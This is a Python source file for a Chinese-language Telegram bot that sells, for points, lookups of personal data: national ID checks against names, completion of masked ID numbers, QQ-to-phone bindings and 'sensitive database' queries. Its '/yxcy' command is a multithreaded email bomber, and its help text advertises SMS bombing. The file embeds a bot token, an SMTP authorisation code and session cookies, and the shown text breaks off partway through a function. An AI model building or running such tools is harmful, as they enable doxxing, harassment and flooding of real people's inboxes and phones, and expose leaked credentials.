import json
import os
import logging
import requests
import re
import smtplib
import threading
from email.mime.text import MIMEText
from email.utils import formataddr
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, filters, MessageHandler

TOKEN = "8688428605:AAFJHSnOFpVJDD13CivOV34antBWRyDSshM"
ADMIN_ID = 8505974377
DATA_FILE = "用户查询数据.json"

logging.disable(logging.CRITICAL)

sender_email = "jiushu2026520@163.com"
auth_code = "DEJZsMtMyZNMzzGN"
smtp_server = "smtp.163.com"
smtp_port = 465
sender_name = "救赎网络科技"
mail_title = "救赎"
THREAD_NUM = 5

def send_mail(target, title, content):
    try:
        msg = MIMEText(content, "plain", "utf-8")
        msg["From"] = formataddr((sender_name, sender_email))
        msg["To"] = target
        msg["Subject"] = title
        server = smtplib.SMTP_SSL(smtp_server, smtp_port)
        server.login(sender_email, auth_code)
        server.sendmail(sender_email, target, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        return False

def task(target, title, content, cnt):
    for _ in range(cnt):
        send_mail(target, title, content)

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def init_user_data(user_id, username=""):
    return {
        "user_id": user_id,
        "username": username,
        "积分": 0,
        "签到次数": 0,
        "邀请人数": 0,
        "查询内容": "",
        "注册时间": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "封禁": False,
        "邀请者": None,
        "最后签到": ""
    }

def get_user_display(user_data):
    return (f"🦸️ 账户: {user_data['user_id']} {user_data['username']}\n"
            f"💎 积分: {user_data['积分']}\n"
            f"🔥 签到: {user_data['签到次数']}\n"
            f"🚀 邀请: {user_data['邀请人数']}\n"
            f"🎉 注册: {user_data['注册时间']}")

def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    username = user.username or user.first_name or ""
    data = load_data()
    
    if user_id not in data:
        data[user_id] = init_user_data(user_id, username)
        save_data(data)
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用机器人。")
        return
    await update.message.reply_text(get_user_display(data[user_id]))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    is_adm = is_admin(user_id)
    
    help_text = (
        "查询指令：\n"
        "/start - 查看个人账号信息\n"
        "/qd - 每日签到 (+5积分)\n"
        "/invite - 获取邀请链接\n"
        "/2ys1 - 二要素查询 (扣除2积分)\n"
        "/2ys2 - 二要素2查询 (扣除2积分)\n"
        "/2ys3 - 二要素3查询 (扣除2积分)\n"
        "/3ys - 三要素核验 (扣除3积分)\n"
        "/hpjy - 和平稳定查询 (扣除3积分)\n"
        "/yxcy - 邮箱测压 (扣除5积分)\n"
        "/kb - 库补查询 (扣除4积分)\n"
        "/mn - 迷你归属地 (扣除1积分)\n"
        "/sj - 手机号归属地 (扣除2积分)\n"
        "/qb - Q绑查询 (扣除2积分)\n"
        "/fr - 法人查询 (扣除5积分)\n"
        "/tqyb - 天气预报 (扣除2积分)\n"
        "/wzxx - 网站基本信息 (扣除3积分)\n"
        "/dxhz - 短信轰炸 (扣除5积分)\n"
        "/sfzjx - 身份证解析 (扣除3积分)\n"
        "/kf - 卡反模糊手机号 (扣除3积分)\n"
        "/mg - 敏感库查询 (扣除2积分)\n"
        "/help - 显示本帮助"
    )
    if is_adm:
        help_text += (
            "\n\n管理员指令：\n"
            "/add <用户ID> <积分数量> - 增加积分\n"
            "/bdd <用户ID> - 清零积分\n"
            "/ban <用户ID> - 封禁用户\n"
            "/jie <用户ID> - 解封用户\n"
        )
    await update.message.reply_text(help_text)

async def checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法签到。")
        return
    
    today = datetime.now().date()
    last_checkin = data[user_id].get("最后签到", "")
    if last_checkin == str(today):
        await update.message.reply_text("⏰ 今天已经签过到了！明天再来吧～")
        return
    
    data[user_id]["积分"] += 5
    data[user_id]["签到次数"] += 1
    data[user_id]["最后签到"] = str(today)
    save_data(data)
    
    await update.message.reply_text(f"✅ 签到成功！+5积分\n{get_user_display(data[user_id])}")

async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法邀请。")
        return
    
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=invite_{user_id}"
    
    keyboard = [[InlineKeyboardButton("🔗 点击复制链接", copy_text=invite_link)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🎟 您的专属邀请链接：\n{invite_link}\n\n每邀请1人可获得10积分！",
        reply_markup=reply_markup
    )

async def handle_start_param(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    new_user_id = str(user.id)
    username = user.username or user.first_name or ""
    data = load_data()
    
    if context.args and context.args[0].startswith("invite_"):
        inviter_id = context.args[0].split("_")[1]
        
        if new_user_id == inviter_id:
            await update.message.reply_text("❌ 不能通过自己的邀请链接注册！")
            return
        
        if new_user_id in data:
            await update.message.reply_text(get_user_display(data[new_user_id]))
            return
        
        if inviter_id not in data or data[inviter_id].get("封禁", False):
            await update.message.reply_text("邀请链接无效或邀请者已被封禁。")
            return
        
        data[new_user_id] = init_user_data(new_user_id, username)
        data[new_user_id]["邀请者"] = inviter_id
        save_data(data)
        
        data[inviter_id]["积分"] += 10
        data[inviter_id]["邀请人数"] += 1
        save_data(data)
        
        await update.message.reply_text(get_user_display(data[new_user_id]))
        
        try:
            await context.bot.send_message(
                chat_id=inviter_id,
                text=f"🎉 您成功邀请了一名新用户！+10积分\n当前积分: {data[inviter_id]['积分']}\n邀请人数: {data[inviter_id]['邀请人数']}"
            )
        except:
            pass
    else:
        await start(update, context)

async def erys_one(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    
    try:
        name = context.args[0]
        id_card = context.args[1]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/2ys1 <姓名> <身份证号>\n例如：/2ys1 张三 11010119900307663X")
        return
    
    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！查询需要2积分。请先签到或邀请好友获取积分。")
        return
    
    data[user_id]["积分"] -= 2
    save_data(data)
    
    await update.message.reply_text("正在核验中，请稍候...")
    
    try:
        url = "https://sucyan.top/api/2ys3.php"
        params = {
            'name': name,
            'id': id_card
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'upgrade-insecure-requests': "1",
            'dnt': "1",
            'x-requested-with': "mark.via",
            'sec-fetch-site': "none",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=0, i"
        }
        
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.encoding = 'utf-8'
        result_text = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 姓名:{name} 证件:{id_card} 结果:{result_text}\n"
        
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        if result_text and "救赎" not in result_text:
            await update.message.reply_text(f"📊 查询结果：\n{result_text}")
        else:
            data[user_id]["积分"] += 2
            save_data(data)
            await update.message.reply_text(f"❌ 查询失败或返回异常，已退还2积分。\n返回内容：{result_text[:200] if result_text else '空响应'}")
            
    except requests.exceptions.Timeout:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("⏰ 查询超时，已退还2积分。请稍后重试。")
    except requests.exceptions.RequestException as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 网络错误，已退还2积分。")
    except Exception as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 未知错误，已退还2积分。")

async def erys_two(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    
    try:
        name = context.args[0]
        id_card = context.args[1]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/2ys2 <姓名> <身份证号>\n例如：/2ys2 张三 11010119900307663X")
        return
    
    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！查询需要2积分。请先签到或邀请好友获取积分。")
        return
    
    data[user_id]["积分"] -= 2
    save_data(data)
    
    await update.message.reply_text("正在核验中，请稍候...")
    
    try:
        url = "https://sucyan.top/api/2ys2.php"
        params = {
            'name': name,
            'id': id_card
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'upgrade-insecure-requests': "1",
            'dnt': "1",
            'x-requested-with': "mark.via",
            'sec-fetch-site': "none",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=0, i"
        }
        
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.encoding = 'utf-8'
        result_text = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 姓名:{name} 证件:{id_card} 结果:{result_text}\n"
        
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        if result_text and "救赎" not in result_text:
            await update.message.reply_text(f"📊 查询结果：\n{result_text}")
        else:
            data[user_id]["积分"] += 2
            save_data(data)
            await update.message.reply_text(f"❌ 查询失败或返回异常，已退还2积分。\n返回内容：{result_text[:200] if result_text else '空响应'}")
            
    except requests.exceptions.Timeout:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("⏰ 查询超时，已退还2积分。请稍后重试。")
    except requests.exceptions.RequestException as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 网络错误，已退还2积分。")
    except Exception as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 未知错误，已退还2积分。")

async def erys_three(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()
    
    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return
    
    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return
    
    try:
        name = context.args[0]
        idcard = context.args[1]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/2ys3 <姓名> <身份证号>\n例如：/2ys3 张三 11010119900307663X")
        return
    
    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！查询需要2积分。请先签到或邀请好友获取积分。")
        return
    
    data[user_id]["积分"] -= 2
    save_data(data)
    
    await update.message.reply_text("正在核验中，请稍候...")
    
    try:
        url = "https://sucyan.top/api/2ys.php"
        params = {
            'name': name,
            'idcard': idcard
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'upgrade-insecure-requests': "1",
            'dnt': "1",
            'x-requested-with': "mark.via",
            'sec-fetch-site': "none",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=0, i",
            'Cookie': "PHPSESSID=k3vusddqhdj4953ila6hkmc9g3"
        }
        
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.encoding = 'utf-8'
        result_text = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 姓名:{name} 证件:{idcard} 结果:{result_text}\n"
        
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        if result_text and "救赎" not in result_text:
            await update.message.reply_text(f"📊 查询结果：\n{result_text}")
        else:
            data[user_id]["积分"] += 2
            save_data(data)
            await update.message.reply_text(f"❌ 查询失败或返回异常，已退还2积分。\n返回内容：{result_text[:200] if result_text else '空响应'}")
            
    except requests.exceptions.Timeout:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("⏰ 查询超时，已退还2积分。请稍后重试。")
    except requests.exceptions.RequestException as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 网络错误，已退还2积分。")
    except Exception as e:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text(f"⚠️ 未知错误，已退还2积分。")

async def three_ys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        name = context.args[0]
        sfz = context.args[1]
        sjh = context.args[2]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/3ys <姓名> <身份证号> <手机号>\n例如：/3ys 张三 11010119900307663X 13800138000")
        return

    if data[user_id]["积分"] < 3:
        await update.message.reply_text("❌ 积分不足！查询需要3积分。请先签到或邀请好友获取积分。")
        return

    data[user_id]["积分"] -= 3
    save_data(data)
    await update.message.reply_text("正在核验中，请稍候...")

    try:
        url = "http://xiaowunb.top/3ys.php"
        params = {
            'name': name,
            'sfz': sfz,
            'sjh': sjh
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Upgrade-Insecure-Requests': "1",
            'dnt': "1",
            'X-Requested-With': "mark.via",
            'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "PHPSESSID=osbth641dph99ivi6e8as7sfu0"
        }
        response = requests.get(url, params=params, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        result = response.text

        ads_to_remove = [
            "💫小无API",
            "💫官方频道:@XWGFTG",
            "💫官方客服:@XWYPW"
        ]
        for ad in ads_to_remove:
            result = result.replace(ad, "")
        result = re.sub(r'\n\s*\n', '\n', result)
        result = result.strip()

        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 姓名:{name} 证件:{sfz} 手机号:{sjh} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        await update.message.reply_text(f"📊 核验结果：\n{result}")
    except requests.exceptions.RequestException as e:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 请求失败，已退还3积分，请稍后重试。")
    except Exception as e:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 未知错误，已退还3积分。")

async def hpjy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        nc = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/hpjy <游戏ID>\n例如：/hpjy 123456")
        return

    if data[user_id]["积分"] < 3:
        await update.message.reply_text("❌ 积分不足！查询需要3积分。请先签到或邀请好友获取积分。")
        return

    data[user_id]["积分"] -= 3
    save_data(data)
    await update.message.reply_text("正在查询和平中，请稍候...")

    try:
        url = "http://xiaowunb.top/%E5%92%8C%E5%B9%B3%E7%B2%BE%E8%8B%B1.php"
        params = {
            'nc': nc
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate",
            'Upgrade-Insecure-Requests': "1",
            'dnt': "1",
            'X-Requested-With': "mark.via",
            'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "PHPSESSID=osbth641dph99ivi6e8as7sfu0"
        }
        response = requests.get(url, params=params, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        result = response.text

        ads_to_remove = [
            "💫小无API",
            "💫官方频道:@XWGFTG",
            "💫官方客服:@XWYPW"
        ]
        for ad in ads_to_remove:
            result = result.replace(ad, "")
        result = re.sub(r'\n\s*\n', '\n', result)
        result = result.strip()

        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 游戏ID:{nc} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)

        await update.message.reply_text(f"📊 查询结果：\n{result}")
    except requests.exceptions.RequestException as e:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 请求失败，已退还3积分，请稍后重试。")
    except Exception as e:
        data[user_id]["积分"] += 3
        save_data(data)
        await update.message.reply_text("❌ 未知错误，已退还3积分。")

async def yxcy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        target_mail = context.args[0]
        mail_content = context.args[1]
        send_cnt = int(context.args[2])
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/yxcy 目标邮箱 自定义内容 次数\n示例：/yxcy test@163.com 123456 10")
        return

    if data[user_id]["积分"] < 5:
        await update.message.reply_text("❌ 积分不足！该功能需要5积分。")
        return

    data[user_id]["积分"] -= 5
    save_data(data)
    await update.message.reply_text("邮箱测压已开始，请耐心等待...")

    try:
        avg = send_cnt // THREAD_NUM
        rem = send_cnt % THREAD_NUM
        threads = []
        for i in range(THREAD_NUM):
            if i < rem:
                t = threading.Thread(target=task, args=(target_mail, mail_title, mail_content, avg + 1))
            else:
                t = threading.Thread(target=task, args=(target_mail, mail_title, mail_content, avg))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 目标邮箱:{target_mail} 内容:{mail_content} 发送次数:{send_cnt} 执行完成\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text("邮箱测压任务全部执行完成✅")
    except Exception as e:
        data[user_id]["积分"] += 5
        save_data(data)
        await update.message.reply_text("❌ 任务执行异常，已退还5积分")

async def kb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        name = context.args[0]
        input_id = context.args[1]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/kb 姓名 模糊身份证\n示例：/kb 张三 110****1234")
        return

    if data[user_id]["积分"] < 4:
        await update.message.reply_text("❌ 积分不足！该功能需要4积分。")
        return

    data[user_id]["积分"] -= 4
    save_data(data)
    await update.message.reply_text("正在库补，请稍候...")

    try:
        url = "https://fm.sucyan.top/kb.php"
        params = {
          'name': name,
          'id': input_id
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua-platform': "\"Android\"",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'content-type': "text/plain",
          'sec-ch-ua-mobile': "?1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "same-origin",
          'sec-fetch-mode': "cors",
          'sec-fetch-dest': "empty",
          'referer': "https://fm.sucyan.top/tool/box/kuBu.php",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=1, i",
          'Cookie': "SITE_TOTAL_ID=fe8f19dc57085512c134cfe23ccc9142"
        }
        response = requests.get(url, params=params, headers=headers, timeout=10)
        result_id = response.text.strip()
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if result_id:
            record = f"[{now_time}] 姓名:{name} 模糊身份证:{input_id} 结果:{result_id} 一致✅\n"
            if data[user_id]["查询内容"]:
                data[user_id]["查询内容"] += record
            else:
                data[user_id]["查询内容"] = record
            save_data(data)
            await update.message.reply_text(f"{name} {result_id} 一致✅")
        else:
            data[user_id]["积分"] += 4
            save_data(data)
            record = f"[{now_time}] 姓名:{name} 模糊身份证:{input_id} 查询失败❌\n"
            if data[user_id]["查询内容"]:
                data[user_id]["查询内容"] += record
            else:
                data[user_id]["查询内容"] = record
            save_data(data)
            await update.message.reply_text("查询失败❌，已退还4积分")
    except:
        data[user_id]["积分"] += 4
        save_data(data)
        await update.message.reply_text("查询失败❌，已退还4积分")

async def mn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        uin = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/mn 迷你号")
        return

    if data[user_id]["积分"] < 1:
        await update.message.reply_text("❌ 积分不足！该功能需要1积分。")
        return

    data[user_id]["积分"] -= 1
    save_data(data)
    await update.message.reply_text("正在查询迷你地区，请稍候...")

    try:
        url = "https://sucyan.top/api/miniaddr.php"
        params = {
          'uin': uin
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'sec-ch-ua-mobile': "?1",
          'sec-ch-ua-platform': "\"Android\"",
          'upgrade-insecure-requests': "1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "cross-site",
          'sec-fetch-mode': "navigate",
          'sec-fetch-user': "?1",
          'sec-fetch-dest': "document",
          'referer': "https://sucyan.us.ci/",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=0, i"
        }
        response = requests.get(url, params=params, headers=headers)
        result = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 迷你号:{uin} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(result)
    except:
        data[user_id]["积分"] += 1
        save_data(data)
        await update.message.reply_text("查询异常❌，已退还1积分")

async def sj(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        phone = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/sj 手机号")
        return

    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！该功能需要2积分。")
        return

    data[user_id]["积分"] -= 2
    save_data(data)
    await update.message.reply_text("正在查询手机归属地，请稍候...")

    try:
        url = "https://fm.sucyan.top/tool/box/phoneInfo.php"
        params = {
          'api': "phone",
          'phone': phone
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua-platform': "\"Android\"",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'content-type': "text/plain",
          'sec-ch-ua-mobile': "?1",
          'x-requested-with': "mark.via",
          'sec-fetch-site': "same-origin",
          'sec-fetch-mode': "cors",
          'sec-fetch-dest': "empty",
          'referer': "https://fm.sucyan.top/tool/box/phoneInfo.php",
          'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
          'priority': "u=1, i",
          'Cookie': "SITE_TOTAL_ID=fe8f19dc57085512c134cfe23ccc9142"
        }
        response = requests.get(url, params=params, headers=headers)
        result = response.text
        now_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record = f"[{now_time}] 手机号:{phone} 结果:{result}\n"
        if data[user_id]["查询内容"]:
            data[user_id]["查询内容"] += record
        else:
            data[user_id]["查询内容"] = record
        save_data(data)
        await update.message.reply_text(result)
    except:
        data[user_id]["积分"] += 2
        save_data(data)
        await update.message.reply_text("查询异常❌，已退还2积分")

async def qb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    data = load_data()

    if user_id not in data:
        await update.message.reply_text("❌ 请先使用 /start 注册！")
        return

    if data[user_id].get("封禁", False):
        await update.message.reply_text("⛔ 您已被封禁，无法使用查询功能。")
        return

    try:
        qq_number = context.args[0]
    except (IndexError, ValueError):
        await update.message.reply_text("❌ 用法：/qb QQ号")
        return

    if data[user_id]["积分"] < 2:
        await update.message.reply_text("❌ 积分不足！该功能需要2积分。")
        return

    data[user_id]["积分"] -= 2
    save_data(data)
    await update.message.reply_text("正在查询Q绑，请稍候...")

    try:
        url = "https://fm.sucyan.top/tool/box/qbind.php"
        params = {
          'api': "qbind",
          'qq': qq_number
        }
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile Safari/537.36",
          'Accept-Encoding': "gzip, deflate, br, zstd",
          'sec-ch-ua-platform': "\"Android\"",
          'sec-ch-ua': "\"Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
          'content-type': "text/plain",
